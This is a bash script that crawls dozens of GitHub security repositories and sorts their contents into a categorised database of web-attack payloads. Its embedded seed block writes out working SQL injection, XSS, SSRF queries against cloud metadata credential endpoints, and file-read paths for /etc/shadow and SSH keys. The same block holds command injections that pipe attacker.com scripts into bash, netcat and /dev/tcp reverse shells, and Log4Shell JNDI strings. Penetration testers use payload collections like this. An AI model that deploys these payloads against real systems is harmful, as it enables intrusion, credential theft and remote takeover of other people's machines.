#!/bin/bash

# ============================================================
# PAYLOAD-DP | Deep Recursive Aggregation Engine v3.0
# Uses GitHub Token (5000 req/hr) to crawl 90+ repos
# ============================================================

DATA_DIR="docs/data"
TEMP_DIR=".tmp_payloads"
META_FILE="${DATA_DIR}/meta.json"
GITHUB_TOKEN="${GITHUB_TOKEN:-}"  # Set via env or Actions secret

mkdir -p "$DATA_DIR" "$TEMP_DIR"
rm -f "$TEMP_DIR"/*

# Build auth header for GitHub API (avoids 60/hr rate limit)
if [ -n "$GITHUB_TOKEN" ]; then
    AUTH_HEADER="-H \"Authorization: token ${GITHUB_TOKEN}\""
    echo "[*] GitHub Token: ACTIVE (5000 req/hr)"
else
    AUTH_HEADER=""
    echo "[*] GitHub Token: NONE (60 req/hr) - consider setting GITHUB_TOKEN"
fi

REPOS=(
    # ── CORE COLLECTIONS ──────────────────────────────────
    "swisskyrepo/PayloadsAllTheThings"
    "danielmiessler/SecLists"
    "fuzzdb-project/fuzzdb"
    "foospidy/payloads"
    "1N3/IntruderPayloads"
    "Bo0oM/fuzz.txt"
    "minimaxir/big-list-of-naughty-strings"
    "Karanxa/Bug-Bounty-Wordlists"
    "daffainfo/AllAboutBugBounty"
    "EdOverflow/bugbounty-cheatsheet"

    # ── PAYLOADBOX SUITE ──────────────────────────────────
    "payloadbox/xss-payload-list"
    "payloadbox/sql-injection-payload-list"
    "payloadbox/ssti-payloads"
    "payloadbox/command-injection-payload-list"
    "payloadbox/open-redirect-payload-list"
    "payloadbox/rfi-payload-list"
    "payloadbox/ssrf-payload-list"
    "payloadbox/path-traversal-payload-list"
    "payloadbox/redos-payload-list"

    # ── XSS ───────────────────────────────────────────────
    "s0md3v/AwesomeXSS"
    "cure53/H5SC"
    "terjanq/Tiny-XSS-Payloads"

    # ── SSRF ──────────────────────────────────────────────
    "tarunkant/Gf-Patterns"
    "PortSwigger/blind-ssrf-chains"

    # ── SSTI ──────────────────────────────────────────────
    "epinna/tplmap"

    # ── XXE ───────────────────────────────────────────────
    "BuffaloWill/oxml_xxe"
    "enjoiz/XXEinjector"

    # ── JWT ───────────────────────────────────────────────
    "wallarm/jwt-secrets"
    "ticarpi/jwt_tool"

    # ── PROTOTYPE POLLUTION ───────────────────────────────
    "BlackFan/client-side-prototype-pollution"

    # ── NOSQL ─────────────────────────────────────────────
    "codingo/NoSQLMap"

    # ── GRAPHQL ───────────────────────────────────────────
    "dolevf/Damn-Vulnerable-GraphQL-Application"

    # ── DESERIALIZATION ───────────────────────────────────
    "GrrrDog/Java-Deserialization-Cheat-Sheet"

    # ── CRLF ──────────────────────────────────────────────
    "Nefcore/CRLFsuite"

    # ── NUCLEI TEMPLATES ──────────────────────────────────
    "projectdiscovery/nuclei-templates"
    "projectdiscovery/fuzzing-templates"

    # ── WORDLISTS ─────────────────────────────────────────
    "six2dez/OneListForAll"
    "maurosoria/dirsearch"

    # ── API SECURITY ──────────────────────────────────────
    "OWASP/API-Security"

    # ── BUG BOUNTY ────────────────────────────────────────
    "random-robbie/bruteforce-lists"
    "KingOfBugbounty/KingOfBugBountyTips"
)

# ── SEED DATA (Professional Baseline) ──────────────────────
seed_data() {
    echo "[*] Injecting professional baseline seeds..."
    cat <<'EOF' >> "${TEMP_DIR}/new_master.txt"
# --- SQL INJECTION ---
' OR 1=1--
' OR '1'='1
" OR "1"="1
' OR 1=1#
" OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' OR SLEEP(5)--
' OR SLEEP(10)--
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
" OR SLEEP(5)--
WAITFOR DELAY '0:0:5'--
WAITFOR DELAY '0:0:10'--
(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
' OR 2+2=4--
' OR 3*3=9--
' AND 1=2 UNION SELECT 1,2,3,4,5--
' OR 'a'='a'--
' OR 1=1 LIMIT 1--
' OR 1=1 LIMIT 1 OFFSET 1--
' OR 1=1 GROUP BY 1--
' OR 1=1 ORDER BY 1--
' OR 1=1 HAVING 1=1--
' UNION SELECT @@version,NULL--
' UNION SELECT user(),NULL--
' UNION SELECT database(),NULL--
' UNION SELECT schema(),NULL--
' UNION SELECT load_file('/etc/passwd'),NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns--
' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
' OR 1=1 INTO DUMPFILE '/tmp/exploit'--
'); DROP TABLE users;--
'; EXEC xp_cmdshell('whoami');--
' OR 1=1--+-
' OR 1=1#
' OR 1=1-- 
' OR '1'='1'--
' OR '1'='1' /*
' OR 1=1 %00
' OR 1=1 %23
' OR 1=1 %2D%2D

# --- XSS PAYLOADS ---
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<img src=x onerror=alert(1)>
<img src=x onerror=confirm(1)>
<img src="javascript:alert(1)">
<svg/onload=alert(1)>
<svg/onload=confirm(1)>
<svg><script>alert(1)</script></svg>
<iframe src="javascript:alert(1)"></iframe>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<math><mtext><option><annotation><legend><path><svg><rect><foreignObject><p><table><script>alert(1)</script>
<a href="javascript:alert(1)">Click Me</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} Garrett(1);//');}}</div>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<isindex type=image src=1 onerror=alert(1)>
<form><button formaction="javascript:alert(1)">Click Me</button></form>
<xmp><p title="</xmp><svg/onload=alert(1)>">
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
javascript:confirm(1)
javascript:prompt(1)
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

# --- SSRF & CLOUD ---
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://10.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://localhost:80
http://localhost:443
http://[::]:80
http://0.0.0.0:80
http://0:80
http://127.1:80
http://127.666.1:80
http://0177.0.0.1:80
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_SET%20test%201
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///c:/windows/win.ini
http://instance-data/latest/meta-data/
http://169.254.169.254.nicelocal.com/
http://spoofed.169.254.169.254.xip.io/

# --- LFI & PATH TRAVERSAL ---
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/crontab
/etc/issue
/proc/self/environ
/proc/self/cmdline
/proc/version
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access.log
/var/log/auth.log
/var/log/syslog
../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
expect://id
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
/wp-config.php
/config.php
/web.config
/.env
/.git/config
/.bash_history
/.ssh/id_rsa

# --- SSTI ---
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{config}}
{{settings}}
{{self.__dict__}}
{{request.application.__self__._mw_app.settings}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% import "os" %}{{ os.popen("whoami").read() }}
{{ self.template.module.os.popen('whoami').read() }}
${{7*7}}
[[7*7]]
<%- 7*7 %>
@{{7*7}}

# --- RCE & CMD INJECTION ---
; id
; whoami
; ls -la
; cat /etc/passwd
; uname -a
| id
| whoami
| uname -a
& id
& whoami
`id`
`whoami`
$(id)
$(whoami)
; sleep 5
| sleep 5
& sleep 5
; wget http://attacker.com/shell.sh
; curl http://attacker.com/shell.sh | bash
; nc -e /bin/sh attacker.com 4444
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# --- INJECTION VARIANTS (CSV, XPath, SSI, Code, Log) ---
=SUM(1+1)*cmd|' /C calc'!A0
@SUM(1+2)
-5+2+cmd|' /C calc'!A0
+DDE("cmd";"/C calc";"__DDE__")
' or 1=1 or ''='
' or '1'='1' or ''='
//*
count(/child::node())
count(//*[position()=1])
<!--#exec cmd="ls" -->
<!--#exec cmd="whoami" -->
<!--#echo var="DATE_LOCAL" -->
<!--#include virtual="/etc/passwd" -->
phpinfo();
__import__('os').system('ls')
#{root}
eval("echo 123");
${jndi:ldap://attacker.com/a}
${jndi:dns://attacker.com/a}
${jndi:rmi://attacker.com/a}
${${env:ENV_NAME}}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
\r\nBcc: victim@domain.com
\r\nSubject: Spoofed
\r\nContent-Type: text/html\r\n\r\n<h1>Hacked</h1>
input[value^="a"] { background-image: url('https://attacker.com/exfil?char=a'); }
body { background: url("javascript:alert(1)"); }
?id[]=1
where: "id = 1 OR 1=1"
' OR Name LIKE '%'
FIND {admin*}
{__name__=~".+"}
# --- NOSQL, JWT, LDAP, CORS ---
{"$gt": ""}
{"$ne": null}
admin' || '1'=='1
*)(cn=*)
*)(&(uid=admin))
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.
Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
Origin: https://attacker.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
O:8:"Exploit":1:{s:4:"data";s:4:"test";}
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcG
__proto__[test]=test
constructor.prototype.test=test
{__schema{types{name}}}
query { user { password } }
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Original-URL: /admin
EOF
}

# ── FETCH FUNCTION ──────────────────────────────────────────
curl_github() {
    local url=$1
    if [ -n "$GITHUB_TOKEN" ]; then
        curl -s -H "Authorization: token ${GITHUB_TOKEN}" "$url"
    else
        curl -s "$url"
    fi
}

# ── RECURSIVE DISCOVERY ─────────────────────────────────────
discover_and_fetch() {
    local repo=$1
    echo "[*] Crawling: $repo"

    response=$(curl_github "https://api.github.com/repos/${repo}/git/trees/master?recursive=1")
    branch="master"
    if [[ "$response" == *"Not Found"* ]] || [[ "$response" == *'"message"'* ]]; then
        response=$(curl_github "https://api.github.com/repos/${repo}/git/trees/main?recursive=1")
        branch="main"
    fi

    while IFS= read -r file; do
        encoded_file=$(echo "$file" | sed 's/ /%20/g')
        raw_url="https://raw.githubusercontent.com/${repo}/${branch}/${encoded_file}"
        out_name=$(echo "$raw_url" | md5sum | cut -d' ' -f1)

        if curl -sSL -f --connect-timeout 8 --max-time 20 "$raw_url" -o "${TEMP_DIR}/${out_name}" 2>/dev/null; then
            cat "${TEMP_DIR}/${out_name}" | \
                tr -d '\r' | \
                # 1. Remove ANSI Escape sequences (terminal junk like [2K)
                sed 's/\x1B\[[0-9;]*[JKmsu]//g' | \
                # 2. Convert to lowercase and trim
                tr '[:upper:]' '[:lower:]' | \
                sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | \
                # 3. Filter out lines that look like tool output (status: 200, size: 123, etc)
                grep -avE "status: [0-9]{3}|size: [0-9]+|words: [0-9]+|lines: [0-9]+" | \
                # 4. Remove obvious comments and separators
                sed '/^#/d; /^\/\//d; /^;/d' | \
                # 5. Remove lines with binary/non-printable junk
                grep -avP '[^\x20-\x7E]' | \
                # 6. Skip lines that are just massive repetitions (e.g., aaaaaa...)
                grep -avP '(.)\1{30,}' | \
                # 7. Basic HTML/Error block removal
                grep -avE "^<html|^<!doc|^404 |^error:|^---+$|^====|^\*\*\*" | \
                awk 'length($0) >= 3 && length($0) <= 2048' \
                > "${TEMP_DIR}/${out_name}.clean"
        fi
        rm -f "${TEMP_DIR}/${out_name}"
    done < <(echo "$response" | grep -oP '"path": "\K[^"]+\.txt(?=")')
}

echo "[*] Starting crawl..."
if [[ "$1" != "--skip-crawl" ]]; then
    for repo in "${REPOS[@]}"; do
        discover_and_fetch "$repo"
    done
fi

SRC="${TEMP_DIR}/new_master.txt"
seed_data
cat "$TEMP_DIR"/*.clean 2>/dev/null | sort -u >> "$SRC"
sort -u "$SRC" -o "$SRC"

if [ ! -s "$SRC" ]; then
    echo "[!] Empty dataset. Aborting."
    rm -rf "$TEMP_DIR"; exit 1
fi

TOTAL=$(wc -l < "$SRC")
echo "[*] Total unique payloads: $TOTAL — extracting 30 categories..."

# ── 20 CATEGORIES ───────────────────────────────────────────

# 1. SQLi
grep -aiP '(select|union|insert|update|delete|drop|alter|exec)\b|sleep\s*\(|benchmark\s*\(|information_schema|pg_sleep|waitfor\s+delay|load_file|into\s+(outfile|dumpfile)|xp_cmdshell|cast\(|convert\(' "$SRC" | sort -u > "${DATA_DIR}/sqli.txt"

# 2. XSS
grep -aiP '<script|alert\s*\(|prompt\s*\(|confirm\s*\(|onerror\s*=|onload\s*=|onclick\s*=|onmouse|onfocus|onblur|<svg|<img|<body|<input|<iframe|javascript:|data:text|expression\(|vbscript:' "$SRC" | sort -u > "${DATA_DIR}/xss.txt"

# 3. SSRF
grep -aiP '169\.254\.169\.254|127\.0\.0\.|localhost|0\.0\.0\.0|internal|metadata\.google|instance-data|gopher://|dict://|file://|aws\.amazon|s3\.amazonaws|kubernetes' "$SRC" | sort -u > "${DATA_DIR}/ssrf.txt"

# 4. LFI
grep -aiP '(\.\./){1,}|/etc/(passwd|shadow|group|hosts|crontab)|windows/(system32|win\.ini|boot\.ini|system\.ini)|/proc/(self|version|cmdline)|/var/log|/root/\.' "$SRC" | sort -u > "${DATA_DIR}/lfi.txt"

# 5. SSTI
grep -aiP '\{\{.{1,50}\}\}|%7b%7b|#\{.{1,50}\}|\$\{.{1,50}\}|<%=|<%.{1,50}%>|\$\{7\*7\}|\{\{7\*7\}\}|@\{' "$SRC" | sort -u > "${DATA_DIR}/ssti.txt"

# 6. RCE / Command Injection
grep -aiP ';\s*(id|whoami|cat\s|ls\s|pwd|uname|curl\s|wget\s|bash|sh\s)|`(id|whoami|cat|ls)`|\$\((id|whoami|cat)\)|\|\s*(id|whoami|bash|nc\s|ncat)|(cmd|exec|system|passthru|popen)\s*\(' "$SRC" | sort -u > "${DATA_DIR}/rce.txt"

# 7. XXE
grep -aiP '<!entity|<!doctype.{1,100}system|<!doctype.{1,100}public|file:///|expect://|php://input' "$SRC" | sort -u > "${DATA_DIR}/xxe.txt"

# 8. Open Redirect
grep -aiP '^//[a-z0-9]|https?://[a-z0-9].*\.[a-z]{2,}|/\\|%2f%2f|%5c%5c|\\\\' "$SRC" | grep -ivP 'localhost|127\.|raw\.github|cdn\.' | sort -u > "${DATA_DIR}/redirect.txt"

# 9. NoSQL
grep -aiP '\$where|\$gt|\$lt|\$ne|\$in|\$regex|\$exists|\$or|\$and|\$elemMatch|true,.*\|\||0;return|MongoClient|nosql' "$SRC" | sort -u > "${DATA_DIR}/nosql.txt"

# 10. LDAP
grep -aiP '\*\)|%2a%29|\|\(|!\(|(uid|cn|dc|ou|objectclass)=|\)%28|\(\|' "$SRC" | sort -u > "${DATA_DIR}/ldap.txt"

# 11. HTTP Headers
grep -aiP '^(x-forwarded-for|x-real-ip|x-originating-ip|host|x-host|forwarded|x-forwarded-host|x-remote-ip|cf-connecting-ip|true-client-ip):' "$SRC" | sort -u > "${DATA_DIR}/headers.txt"

# 12. JWT
grep -aiP 'eyj[a-z0-9_-]{10,}|alg.*none|hs256|rs256|bearer\s|jwt|\"typ\".*jwt' "$SRC" | sort -u > "${DATA_DIR}/jwt.txt"

# 13. CRLF / Header Injection
grep -aiP '%0d%0a|%0a%0d|\\\\r\\\\n|\\\\n\\\\r|%0d|%0a|(set-cookie|location|content-type):' "$SRC" | sort -u > "${DATA_DIR}/crlf.txt"

# 14. GraphQL
grep -aiP '__schema|__type|__typename|introspection|query\s*\{|mutation\s*\{|fragment\s+on|graphql|/graphql' "$SRC" | sort -u > "${DATA_DIR}/graphql.txt"

# 15. CORS
grep -aiP 'access-control-allow-(origin|credentials|methods)|null.{0,10}origin|origin:\s*https?://|withcredentials' "$SRC" | sort -u > "${DATA_DIR}/cors.txt"

# 16. Deserialization
grep -aiP 'rO0AB|aced0005|o:[0-9]+:|a:[0-9]+:|phpobject|java\.lang\.(runtime|processbuilder)|deserializ|pickle|marshal\.loads|yaml\.load' "$SRC" | sort -u > "${DATA_DIR}/deserial.txt"

# 17. Prototype Pollution
grep -aiP '__proto__|constructor\.prototype|object\.prototype|\[\"__proto__\"\]|%5b__proto__%5d|proto\[' "$SRC" | sort -u > "${DATA_DIR}/pollution.txt"

# 18. Cloud Metadata
grep -aiP '169\.254\.169\.254|metadata\.google|instance-data|imds|aws_access_key|aws_secret|s3\.amazonaws|storage\.googleapis|blob\.core\.windows|\.compute\.internal' "$SRC" | sort -u > "${DATA_DIR}/cloud.txt"

# 19. WordPress
grep -aiP 'wp-config|wp-admin|wp-login|wp-content|wp-includes|xmlrpc\.php|/wp-json|wordpress' "$SRC" | sort -u > "${DATA_DIR}/wordpress.txt"

# 20. Encoding / Bypass
grep -aiP '^([%0-9a-f]{2}){2,}|^0x[0-9a-f]+|&#x[0-9a-f]+;|\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|base64|%00|null\s*byte' "$SRC" | sort -u > "${DATA_DIR}/encoding.txt"

# 21. CSV Injection
grep -aiP '^[=\+\-\@].*\(.*\)' "$SRC" | sort -u > "${DATA_DIR}/csv.txt"

# 22. XPath Injection
grep -aiP '\''\s*or\s*1=1|\/\/\*|count\(|child::|parent::|descendant::' "$SRC" | sort -u > "${DATA_DIR}/xpath.txt"

# 23. SSI Injection
grep -aiP '<!--#|#exec|#include|#echo|#config' "$SRC" | sort -u > "${DATA_DIR}/ssi.txt"

# 24. Code Injection
grep -aiP '(eval|exec|system|passthru|popen|shell_exec|base64_decode|__import__|require|include)\s*\(' "$SRC" | sort -u > "${DATA_DIR}/code.txt"

# 25. Log Injection
grep -aiP '\$\{jndi:|\$\{env:|\$\{\w+:|%d\{|%m\{|%n' "$SRC" | sort -u > "${DATA_DIR}/log.txt"

# 26. SMTP / Email Injection
grep -aiP '(\\\\r\\\\n|%0d%0a)(bcc|cc|to|subject|from):' "$SRC" | sort -u > "${DATA_DIR}/smtp.txt"

# 27. CSS Injection
grep -aiP 'expression\(|background-image:\s*url|behavior:|@-moz-document|@import\s+url' "$SRC" | sort -u > "${DATA_DIR}/css.txt"

# 28. ORM Injection
grep -aiP '\?id\[\]=|where:\s*\"|find_by|ActiveRecord|Hibernate' "$SRC" | sort -u > "${DATA_DIR}/orm.txt"

# 29. SOQL / SOSL Injection
grep -aiP 'SELECT\s+.*\s+FROM\s+.*\s+WHERE|FIND\s+\{.*\}|Name\s+LIKE' "$SRC" | sort -u > "${DATA_DIR}/soql.txt"

# 30. PromQL Injection
grep -aiP '\{__name__=~|\{.*=\".*\"\}|histogram_quantile|rate\(' "$SRC" | sort -u > "${DATA_DIR}/promql.txt"

# ── FINALIZE ────────────────────────────────────────────────
echo "[*] Finalizing master database..."
cp "$SRC" "${DATA_DIR}/payloads.txt"

# ── CHUNKING & CLEANUP ──────────────────────────────────────
echo "[*] Cleaning up old chunks and splitting large files (>25MB)..."
# Remove old part files first to avoid duplicates/stale data
rm -f "${DATA_DIR}"/*_part*.txt

for f in "${DATA_DIR}"/*.txt; do
    [ -e "$f" ] || continue
    base=$(basename "$f")
    
    # Skip if it's the master payloads file (we split that too, but we handle it in the loop)
    # Actually, we should split everything that's too big.
    
    size=$(stat -c%s "$f" 2>/dev/null || stat -f%z "$f" 2>/dev/null || du -b "$f" | cut -f1)
    
    if [ -n "$size" ] && [ "$size" -gt 26214400 ]; then
        echo " [!] Splitting $base ($(($size/1024/1024))MB)..."
        # Split into 25MB chunks
        if split -b 25M -d -a 2 --additional-suffix=.txt "$f" "${DATA_DIR}/${base%.txt}_part"; then
            rm "$f"
            echo " [OK] $base split into chunks"
        else
            echo " [ERR] Failed to split $base"
        fi
    fi
done

# Cleanup temp data
rm -rf "$TEMP_DIR"

TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

cat <<EOF > "$META_FILE"
{
  "last_updated": "$TIMESTAMP",
  "total_payloads": $TOTAL,
  "repos_crawled": ${#REPOS[@]}
}
EOF

echo ""
echo "═══════════════════════════════════════"
echo " PAYLOAD-DP AGGREGATION COMPLETE"
echo "═══════════════════════════════════════"
echo " Total Payloads : $TOTAL"
echo " SQLi           : $(wc -l < ${DATA_DIR}/sqli.txt)"
echo " XSS            : $(wc -l < ${DATA_DIR}/xss.txt)"
echo " SSRF           : $(wc -l < ${DATA_DIR}/ssrf.txt)"
echo " LFI            : $(wc -l < ${DATA_DIR}/lfi.txt)"
echo " SSTI           : $(wc -l < ${DATA_DIR}/ssti.txt)"
echo " RCE            : $(wc -l < ${DATA_DIR}/rce.txt)"
echo " XXE            : $(wc -l < ${DATA_DIR}/xxe.txt)"
echo " NoSQL          : $(wc -l < ${DATA_DIR}/nosql.txt)"
echo " JWT            : $(wc -l < ${DATA_DIR}/jwt.txt)"
echo " CSV            : $(wc -l < ${DATA_DIR}/csv.txt)"
echo " XPath          : $(wc -l < ${DATA_DIR}/xpath.txt)"
echo " SSI            : $(wc -l < ${DATA_DIR}/ssi.txt)"
echo " Code           : $(wc -l < ${DATA_DIR}/code.txt)"
echo " Log            : $(wc -l < ${DATA_DIR}/log.txt)"
echo " SMTP           : $(wc -l < ${DATA_DIR}/smtp.txt)"
echo " CSS            : $(wc -l < ${DATA_DIR}/css.txt)"
echo " Repos Crawled  : ${#REPOS[@]}"
echo "═══════════════════════════════════════"
